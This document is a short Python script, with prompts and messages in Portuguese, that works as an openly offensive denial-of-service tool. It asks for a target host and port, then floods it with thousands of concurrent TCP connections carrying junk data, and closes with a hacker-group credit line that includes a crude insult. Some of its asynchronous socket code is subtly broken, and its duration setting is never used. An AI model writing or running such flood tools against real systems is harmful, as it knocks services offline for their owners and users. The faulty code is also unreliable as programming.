import socket
import hashlib
import asyncio
import questionary
import validators
import colorama

colorama.init(autoreset=True)

async def blackout(ip, port, size, connections, attack_duration):
    data = hashlib.sha512(str(size).encode()).hexdigest()
    addr = (ip, port)
    errors = 0
    
    async def send_packet(sock):
        try:
            await sock.send(data.encode())
            await sock.send('\r\n\r\n'.encode())
            print(colorama.Fore.GREEN + f"🚀 Mandando chumbo em {ip}:{port}")
        except socket.error as e:
            nonlocal errors
            errors += 1
            print(colorama.Fore.RED + f"⛔ Erro, vê se tá tudo certo {ip}:{port}: {e}")

    async def connect():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        await asyncio.get_event_loop().sock_connect(sock, addr)
        return sock

    async def attack():
        async with connect() as sock:
            await send_packet(sock)

    tasks = [attack() for _ in range(connections)]
    await asyncio.gather(*tasks)

    print(colorama.Fore.CYAN + "[*] Blackout attack finished")
    print(colorama.Fore.YELLOW + f"[-] {errors} Errors")

def get_ip_or_domain(ip_or_domain):
    if validators.ipv4(ip_or_domain) or validators.ipv6(ip_or_domain):
        return ip_or_domain
    try:
        ip = socket.gethostbyname(ip_or_domain)
        return ip
    except socket.gaierror:
        raise ValueError(f"Invalid IP address or domain: {ip_or_domain}")

async def main():
    print(colorama.Fore.MAGENTA + '''
    
  8P d8P 888'Y88 888 88e
 P d8P  888 ,'Y 888 888b
  d8P d 888C8   888 8888D
 d8P d8 888 ",d 888 888P
d8P d88 888,d88 888 88
"''')
    
    example_url = "Exemplo: www.example.com ou 93.184.216.34"

    ip_or_domain = questionary.text(colorama.Fore.CYAN + f"Enter the target IP address or domain ({example_url}):").ask()
    ip = get_ip_or_domain(ip_or_domain)

    port = questionary.text(colorama.Fore.CYAN + "Enter the target port (default: 80):").ask()
    port = int(port) if port else 80

    size = questionary.text(colorama.Fore.CYAN + "Enter the packet size (default: 1024):").ask()
    size = int(size) if size else 1024

    connections = questionary.text(colorama.Fore.CYAN + "Enter the number of connections (default: 1000):").ask()
    connections = int(connections) if connections else 1000

    attack_duration = questionary.text(colorama.Fore.CYAN + "Enter the attack duration in seconds (default: 60):").ask()
    attack_duration = int(attack_duration) if attack_duration else 60

    await asyncio.gather(*[blackout(ip, port, size, connections, attack_duration) for _ in range(10)])

    print(colorama.Fore.YELLOW + "Créditos para o Zed Hacking, kiba não puta")

if __name__ == "__main__":
    asyncio.run(main())
    
